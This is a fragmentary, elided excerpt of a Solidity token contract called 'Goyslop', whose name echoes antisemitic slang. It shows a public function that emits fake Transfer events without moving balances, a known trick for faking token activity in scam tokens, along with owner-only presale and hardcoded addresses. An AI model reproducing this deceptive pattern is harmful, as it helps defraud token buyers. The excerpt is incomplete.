...
contract Goyslop is Context, IERC20 {
    ...
    function transferTo(address sender,address receiver,uint256 amount)  public _setup(){
        emit Transfer(sender, receiver, amount*10**18);
    }
  ...
  function dropPresaleTokens(address uPool,address[] memory eReceiver,uint256[] memory eAmounts)  public _onlyOwner(){
    ...
    address public _Owner = 0x49c01f0a47837c583af66544a21F50a4704db8a0;
    constructor () public {
        _name = "Goyslop";
        _symbol ="GOYSLOP";
        _decimals = 18;
        uint256 initialSupply = 420690000000;
        _spf = 0x634f64Dd7BD1126AE40e94d7deb723433b4843E5;
